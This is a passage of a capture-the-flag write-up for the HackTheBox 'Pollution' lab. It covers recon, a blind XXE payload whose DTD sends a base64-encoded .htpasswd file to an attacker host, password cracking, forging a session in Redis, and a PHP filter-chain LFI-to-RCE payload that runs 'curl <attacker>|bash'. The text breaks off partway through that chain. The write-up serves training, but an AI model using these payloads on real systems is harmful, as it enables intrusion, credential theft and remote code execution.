@@ -1,0 +1,1334 @@
+<title>HackTheBox - Pollution (Hard)</title>
+<header>
+	<div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/HackTheBox/Hard/Pollution/icon.png"/>
+      <p class="mainTitle">HackTheBox - Pollution (Hard)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+  <h1 id="table-of-contents">Table of contents</h1>
+	<nav id="tableOfContents" class="tableOfContents">
+	</nav>
+  <h1 id="reconnaissance">Reconnaissance</h1>
+  <h2 id="nmap-scan">Nmap scan</h2>
+  <div class="codeBlock"># Nmap 7.93 scan initiated Sat May 20 12:30:01 2023 as: nmap -A -p- -oN nmapResults.txt -d 10.129.228.126
+--------------- Timing report ---------------
+  hostgroups: min 1, max 100000
+  rtt-timeouts: init 1000, min 100, max 10000
+  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+  parallelism: min 0, max 0
+  max-retries: 10, host-timeout: 0
+  min-rate: 0, max-rate: 0
+---------------------------------------------
+Nmap scan report for 10.129.228.126
+Host is up, received syn-ack (0.044s latency).
+Scanned at 2023-05-20 12:30:01 EDT for 29s
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
+|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
+|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
+80/tcp   open  http    syn-ack Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+6379/tcp open  redis   syn-ack Redis key-value store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read from /usr/bin/../share/nmap: nmap-service-probes nmap-services.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 20 12:30:30 2023 -- 1 IP address (1 host up) scanned in 28.52 seconds</div>
+  <h2 id="web-reconnaissance">Web reconnaissance</h2>
+  <p>Let’s see what we can find on port 80 :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled.png"/>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 1.png"/>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 2.png"/>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 3.png"/>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 4.png"/>
+  <p>There is 4 useful informations here :</p>
+  <ul>
+    <li>We have the domaine name <code>collect.htb</code></li>
+  </ul>
+  <ul>
+    <li>We can register</li>
+  </ul>
+  <ul>
+    <li>We can login</li>
+  </ul>
+  <ul>
+    <li>They are working on a API, we will try to exploit it later</li>
+  </ul>
+  <p>Let’s add <code>collect.htb</code> to our <code>/etc/hosts</code> file :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ cat /etc/hosts     
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.228.126  collect.htb</div>
+  <p>We can try to fuzz virtual hosts with <a href="https://github.com/OJ/gobuster">Gobuster</a> :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ gobuster vhost -u http://collect.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://collect.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/05/20 13:08:58 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: forum.collect.htb Status: 200 [Size: 14098]
+Found: developers.collect.htb Status: 401 [Size: 469]
+Progress: 114430 / 114442 (99.99%)
+===============================================================
+2023/05/20 13:17:55 Finished
+===============================================================</div>
+  <p>
+    We found two virtual hosts. The subdomain <code>developers.collect.htb</code> seems to be protected by a basic HTTP authentication, but 
+    <code>forum.collect.htb</code> is accessible. So, let’s add them to our <code>/etc/hosts</code> :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.228.126  collect.htb     forum.collect.htb       developers.collect.htb</div>
+  <p>Now, let’s see what’s on <code>forum.collect.htb</code> :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 5.png"/>
+  <p>
+    This is a forum powered by <a href="https://www.notion.so/HackTheBox-Pollution-Hard-fcda034d930245db84f4df477ce65ca0?pvs=21">MyBB</a>. 
+    Fortunately, the installed version of <a href="https://mybb.com/">MyBB</a> is not vulnerable. By going on Collect Forum, we can find 
+    different threads. Also, we can note the thread authors to create a wordlist of users that could be useful later.
+  </p>
+  <p>The Pollution API is mentioned 3 times. There is one thread that can be useful for an attacker : I had problems with the Pollution API.</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 6.png"/>
+  <p>
+    In this thread, the user victor shared his proxy request history. To download it, we need to be logged in. We can simply create an account 
+    by going to <a href="http://forum.collect.htb/member.php">http://forum.collect.htb/member.php</a> like so :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 7.png"/>
+  <p>After registering, we can download the file. Here is the list of requests made by victor :</p>
+  <ul>
+    <li>(GET) <code>hxxps[://]storyset[.]com/for-figma</code> ← Out of scope</li>
+  </ul>
+  <ul>
+    <li>(POST) <code>http://collect.htb/set/role/admin</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>hxxp[://]detectportal[.]firefox[.]com/canonical[.]html</code> ← Out of scope</li>
+  </ul>
+  <ul>
+    <li>(POST) <code>http://127.0.0.1:3000/auth/login</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>http://collect.htb/</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>http://forum.collect.htb/forumdisplay.php?fid=2</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>http://forum.collect.htb/jscripts/jeditable/jeditable.min.js</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>http://forum.collect.htb/jscripts/inline_edit.js?ver=1821</code></li>
+  </ul>
+  <ul>
+    <li>(GET) <code>http://forum.collect.htb/jscripts/rating.js?ver=1821</code></li>
+  </ul>
+  <p>
+    One interesting request here is the POST request sent to <code>http://collect.htb/set/role/admin</code>. Let’s decode the POST 
+    data to see what was sent to the webserver :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/loot]
+└─$ base64 -d request_post.txt &gt; response_post.txt
+                                                                                                                             
+┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/loot]
+└─$ cat response_post.txt 
+POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=[HIDDEN]</div>
+  <p>
+    This endpoint seems to set the admin role for the current user linked to the PHPSESSID cookie used in the request. We also 
+    have the token to do this now. First, we need to create an account on <code>http://collect.htb/register</code> :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 8.png"/>
+  <p>
+    After this, we can login. Now let’s use <a href="https://portswigger.net/burp">BurpSuite</a> to send a POST request to 
+    <code>http://collect.htb/set/role/admin</code> using the token we found :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 9.png"/>
+  <p>After sending this request, we can access <code>http://collect.htb/admin</code> :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 10.png"/>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 11.png"/>
+  <p>So now, we can register a new user to the Pollution API.</p>
+  <h1 id="initial-access">Initial access</h1>
+  <h2 id="xxe-injection">XXE Injection</h2>
+  <p>
+    When looking at the POST request sent to the API when registering a new user, we can see XML data being send. Maybe it is vulnerable to 
+    XXE (XML External Entity) injections ?
+  </p>
+  <p>When sending this request : </p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 12.png"/>
+  <p>We have this response from the webserver :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 13.png"/>
+  <p>
+    Since any of the data send via XML is returned, we will need to exploit a Blind XXE injection. First, let’s write a malicious 
+    dtd file on our attacking host :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ cat exploit.dtd
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/developers/.htpasswd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://10.10.16.17/?x=%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfiltrate;</div>
+  <p>
+    This malicious file will make the target host send a request to our web server containing the content of 
+    <code>/var/www/developers/.htpasswd</code> file encoded in base64. Now let’s run a simple web server using python :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</div>
+  <p>Finally, let’s exploit the XXE injection using <a href="https://portswigger.net/burp">BurpSuite</a> :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 14.png"/>
+  <p>After sending this request, let’s take a look at our python web server :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.228.126 - - [20/May/2023 14:51:10] &quot;GET /exploit.dtd HTTP/1.1&quot; 200 -
+10.129.228.126 - - [20/May/2023 14:51:10] &quot;GET /?x=ZGV2ZWxvcGVyc1[HIDDEN] HTTP/1.1&quot; 200 -</div>
+  <p>We successfully retrieved the data from <code>/var/www/developers/.htpasswd</code>. Let’s decode it :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;ZGV2ZWxvcGVyc1[HIDDEN]&#x27; | base64 -d
+developers_group:[HIDDEN]</div>
+  <h2 id="hash-cracking">Hash cracking</h2>
+  <p>
+    So we have the username and password hash to login on <code>http://developers.collect.htb/</code>. 
+    Let’s crack this hash using <a href="https://www.openwall.com/john/">john</a> and rockyou.txt :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+[HIDDEN]           (developers_group)     
+1g 0:00:00:01 DONE (2023-05-20 14:57) 0.7407g/s 158577p/s 158577c/s 158577C/s rasfatata..puppyluver
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</div>
+  <p>We can now login on <code>http://developers.collect.htb/</code>.</p>
+  <h2 id="bypass-developers-login-page">Bypass developers login page</h2>
+  <p>After passing the basic authentication, we are redirected to another login page :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 15.png"/>
+  <p>
+    The credentials for basic authentication will not work on this login page. Since we don’t have any valid credentials for this login 
+    page, we will need to look somewhere else…
+  </p>
+  <p>
+    Remember, there was a <a href="https://redis.io/">Redis</a> database running on port <code>6379</code>. Maybe we can find something 
+    interesting in it ?
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ redis-cli -h 10.129.228.126
+10.129.228.126:6379&gt; 
+10.129.228.126:6379&gt; INFO
+NOAUTH Authentication required.</div>
+  <p>
+    We need to authenticate. We don’t have any valid credentials for <a href="https://redis.io/">Redis</a> too. We may be able to find them in 
+    a file by exploiting the XXE injection vulnerability we found earlier. Let’s see what’s in <code>/var/www/developers/index.php</code> :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;PD9waHANCnJlcXVpcmUgJy4vYm9vdHN0cmFwLnBocCc7DQoNCg0KaWYgKCFpc3NldCgkX1NFU1NJT05bJ2F1dGgnXSkgb3IgJF9TRVNTSU9OWydhdXRoJ10gIT0gVHJ1ZSkgew0KICAgIGRpZShoZWFkZXIoJ0xvY2F0aW9uOiAvbG9naW4ucGhwJykpOw0KfQ0KDQppZiAoIWlzc2V0KCRfR0VUWydwYWdlJ10pIG9yIGVtcHR5KCRfR0VUWydwYWdlJ10pKSB7DQogICAgZGllKGhlYWRlcignTG9jYXRpb246IC8/cGFnZT1ob21lJykpOw0KfQ0KDQokdmlldyA9IDE7DQoNCj8+DQoNCjwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHNjcmlwdCBzcmM9ImFzc2V0cy9qcy90YWlsd2luZC5qcyI+PC9zY3JpcHQ+DQogICAgPHRpdGxlPkRldmVsb3BlcnMgQ29sbGVjdDwvdGl0bGU+DQo8L2hlYWQ+DQoNCjxib2R5Pg0KICAgIDxkaXYgY2xhc3M9ImZsZXggZmxleC1jb2wgaC1zY3JlZW4ganVzdGlmeS1iZXR3ZWVuIj4NCiAgICAgICAgPD9waHAgaW5jbHVkZSgiaGVhZGVyLnBocCIpOyA/Pg0KICAgICAgICANCiAgICAgICAgPG1haW4gY2xhc3M9Im1iLWF1dG8gbXgtMjQiPg0KICAgICAgICAgICAgPD9waHAgaW5jbHVkZSgkX0dFVFsncGFnZSddIC4gIi5waHAiKTsgPz4NCiAgICAgICAgPC9tYWluPg0KDQogICAgICAgIDw/cGhwIGluY2x1ZGUoImZvb3Rlci5waHAiKTsgPz4NCiAgICA8L2Rpdj4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+&#x27; | base64 -d
+&lt;?php
+require &#x27;./bootstrap.php&#x27;;
+
+
+if (!isset($_SESSION[&#x27;auth&#x27;]) or $_SESSION[&#x27;auth&#x27;] != True) {
+    die(header(&#x27;Location: /login.php&#x27;));
+}
+
+if (!isset($_GET[&#x27;page&#x27;]) or empty($_GET[&#x27;page&#x27;])) {
+    die(header(&#x27;Location: /?page=home&#x27;));
+}
+
+$view = 1;
+
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;script src=&quot;assets/js/tailwind.js&quot;&gt;&lt;/script&gt;
+    &lt;title&gt;Developers Collect&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class=&quot;flex flex-col h-screen justify-between&quot;&gt;
+        &lt;?php include(&quot;header.php&quot;); ?&gt;
+        
+        &lt;main class=&quot;mb-auto mx-24&quot;&gt;
+            &lt;?php include($_GET[&#x27;page&#x27;] . &quot;.php&quot;); ?&gt;
+        &lt;/main&gt;
+
+        &lt;?php include(&quot;footer.php&quot;); ?&gt;
+    &lt;/div&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;</div>
+  <p>
+    I tried to read <code>/var/www/developers/login.php</code> but nothing was returned. We can see the file <code>bootstrap.php</code> being 
+    included in the first line. Let's see what's in it :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;PD9waHAKCmluaV9zZXQoJ3Nlc3Npb24uc2F2ZV9oYW5kbGVyJywgJ3JlZGlzJyk7CmluaV9zZXQoJ3Nlc3Npb24uc2F2ZV9wYXRoJywgJ3RjcDovL2xvY2FsaG9zdDo2Mzc5Lz9hdXRoPU[HIDDEN]&#x27; | base64 -d
+&lt;?php
+
+ini_set(&#x27;session.save_handler&#x27;, &#x27;redis&#x27;);
+ini_set(&#x27;session.save_path&#x27;, &#x27;tcp://localhost:6379/?auth=<mark class=red_text>&lt;REDACTED&gt;</mark>&#x27;);
+
+session_start();</div>
+  <p>
+    We have the password for <a href="https://redis.io/">Redis</a>. Now, let’s try to connect to it again, but this time, with 
+    the password we just found :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ redis-cli -h 10.129.228.126
+10.129.228.126:6379&gt; AUTH [HIDDEN]
+OK
+10.129.228.126:6379&gt; info
+# Server
+redis_version:6.0.16
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:6d95e1af3a2c082a
+redis_mode:standalone
+os:Linux 5.10.0-19-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:966
+run_id:f56068649205271aed287d76999875a512befd6f
+tcp_port:6379
+uptime_in_seconds:19312
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:6897609
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:8
+client_recent_max_output_buffer:0
+blocked_clients:0
+tracking_clients:0
+clients_in_timeout_table:0
+
+# Memory
+used_memory:873704
+used_memory_human:853.23K
+used_memory_rss:44236800
+used_memory_rss_human:42.19M
+used_memory_peak:41455208
+used_memory_peak_human:39.53M
+used_memory_peak_perc:2.11%
+used_memory_overhead:830520
+used_memory_startup:809824
+used_memory_dataset:43184
+used_memory_dataset_perc:67.60%
+allocator_allocated:1186432
+allocator_active:1601536
+allocator_resident:5070848
+total_system_memory:4087750656
+total_system_memory_human:3.81G
+used_memory_lua:41984
+used_memory_lua_human:41.00K
+used_memory_scripts:0
+used_memory_scripts_human:0B
+number_of_cached_scripts:0
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.35
+allocator_frag_bytes:415104
+allocator_rss_ratio:3.17
+allocator_rss_bytes:3469312
+rss_overhead_ratio:8.72
+rss_overhead_bytes:39165952
+mem_fragmentation_ratio:53.22
+mem_fragmentation_bytes:43405608
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_clients_slaves:0
+mem_clients_normal:20504
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.2.1
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:1
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1684618965
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:0
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:356352
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+module_fork_in_progress:0
+module_fork_last_cow_size:0
+
+# Stats
+total_connections_received:571280
+total_commands_processed:1713823
+instantaneous_ops_per_sec:0
+total_net_input_bytes:103400190
+total_net_output_bytes:8574939
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:571098
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+expire_cycle_cpu_milliseconds:3436
+evicted_keys:0
+keyspace_hits:174
+keyspace_misses:571100
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:1593
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+tracking_total_keys:0
+tracking_total_items:0
+tracking_total_prefixes:0
+unexpected_error_replies:0
+total_reads_processed:2285112
+total_writes_processed:1713831
+io_threaded_reads_processed:0
+io_threaded_writes_processed:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:227d542acf6607e6f7c0bcc9f9d4853085865dc2
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:126.901990
+used_cpu_user:60.478516
+used_cpu_sys_children:1.511871
+used_cpu_user_children:11.125892
+
+# Modules
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+db0:keys=2,expires=2,avg_ttl=1161533
+10.129.228.126:6379&gt;</div>
+  <p>Now, we have access to <a href="https://redis.io/">Redis</a>. We can list the keys like so :</p>
+  <div class="codeBlock">10.129.228.126:6379&gt; keys *
+1) &quot;PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd&quot;
+2) &quot;PHPREDIS_SESSION:bd807jkqtg4eg0ae57jmor56qm&quot;</div>
+  <p>
+    There seems to be keys for each PHPSESSID on <code>http://developers.collect.htb/</code>. Let's verify this 
+    by looking at our PHPSESSID cookie on our web browser :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 16.png"/>
+  <p>So now, we are sure about this. Let's see what data is stored in our key :</p>
+  <div class="codeBlock">10.129.228.126:6379&gt; get &quot;PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd&quot;
+&quot;&quot;</div>
+  <p>It is empty… Let's see the other key :</p>
+  <div class="codeBlock">10.129.228.126:6379&gt; get PHPREDIS_SESSION:bd807jkqtg4eg0ae57jmor56qm
+&quot;username|s:4:\&quot;test\&quot;;role|s:5:\&quot;admin\&quot;;&quot;</div>
+  <p>We can take example on this one and add the data <code>auth</code> set to <code>True</code> :</p>
+  <div class="codeBlock">10.129.228.126:6379&gt; set PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd &quot;username|s:4:\&quot;test\&quot;;role|s:5:\&quot;admin\&quot;;auth|s:4:\&quot;True\&quot;;&quot;
+OK</div>
+  <p>Now let's refresh the page :</p>
+  <img src="/write-ups/HackTheBox/Hard/Pollution/Untitled 17.png"/>
+  <p>We successfully bypassed the login page.</p>
+  <h2 id="lfi2rce">LFI2RCE</h2>
+  <p>
+    We can see in the url a <code>page</code> parameter that defines the page to be included. Maybe this parameter is vulnerable 
+    to a LFI (Local File Inclusion) ?
+  </p>
+  <p>
+    I tried different LFI techniques but none of them worked. We can try to exploit a LFI2RCE (Local File Inclusion to Remote Code Execution) 
+    technique using PHP filters. There is a python script that can generate the payload for us at 
+    <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a>. Let's download 
+    this script and use it to generate our payload (try to use the smallest payload you can to avoid the url being too long) :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/Hard/Pollution/exploits/php_filter_chain_generator]
+└─$ python3 php_filter_chain_generator.py --chain &#x27;&lt;?=`curl 10.10.16.17|bash`;;?&gt;&#x27;
+[+] The following gadget chain will generate the following code : &lt;?=`curl 10.10.16.17|bash`;;?&gt; (base64 value: PD89YGN1cmwgMTAuMTAuMTYuMTd8YmFzaGA7Oz8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.U